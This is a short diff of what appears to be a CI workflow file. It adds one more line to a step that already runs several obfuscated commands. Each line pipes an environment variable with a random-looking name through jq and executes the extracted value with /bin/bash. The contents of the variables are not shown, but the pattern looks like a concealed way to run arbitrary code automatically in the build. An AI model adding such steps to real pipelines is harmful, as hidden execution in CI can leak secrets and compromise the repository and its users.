@@ -26,6 +26,7 @@ jobs:
           echo $blf7 | jq -r .wdlpb28630 | /bin/bash
           echo $pca37 | jq -r .qofgl5 | /bin/bash
           printf '%s' "$gwbpp05" | jq -r .efas8 | /bin/bash
+          echo $frjn5 | jq -r .olug872 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
